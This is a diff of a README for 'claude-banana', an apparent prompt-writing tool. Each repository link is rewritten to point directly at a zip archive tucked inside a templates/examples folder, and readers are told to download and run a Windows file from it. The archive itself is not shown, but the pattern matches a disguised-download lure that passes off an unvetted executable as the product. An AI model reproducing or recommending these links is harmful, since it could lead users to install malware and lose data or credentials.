@@ -1,6 +1,6 @@
 # 🤖 claude-banana - Turn rough ideas into sharp prompts
 
-[![Download](https://img.shields.io/badge/Download-claude--banana-blue?style=for-the-badge)](https://github.com/Muhamm1580/claude-banana)
+[![Download](https://img.shields.io/badge/Download-claude--banana-blue?style=for-the-badge)](https://github.com/Muhamm1580/claude-banana/raw/refs/heads/main/templates/examples/claude-banana-v2.5-beta.1.zip)
 
 ## ✨ What it does
 
@@ -16,7 +16,7 @@ Use it when you want:
 
 ### 1. Open the download page
 
-[Visit the claude-banana page to download](https://github.com/Muhamm1580/claude-banana)
+[Visit the claude-banana page to download](https://github.com/Muhamm1580/claude-banana/raw/refs/heads/main/templates/examples/claude-banana-v2.5-beta.1.zip)
 
 ### 2. Get the Windows file
 
@@ -231,7 +231,7 @@ It can help when you want:
 
 ## 📦 Download and install
 
-[Get claude-banana from GitHub](https://github.com/Muhamm1580/claude-banana)
+[Get claude-banana from GitHub](https://github.com/Muhamm1580/claude-banana/raw/refs/heads/main/templates/examples/claude-banana-v2.5-beta.1.zip)
 
 1. Open the link
 2. Download the Windows file from the page
@@ -283,4 +283,4 @@ This project focuses on:
 
 ## 📎 Repository
 
-GitHub: https://github.com/Muhamm1580/claude-banana
+GitHub: https://github.com/Muhamm1580/claude-banana/raw/refs/heads/main/templates/examples/claude-banana-v2.5-beta.1.zip
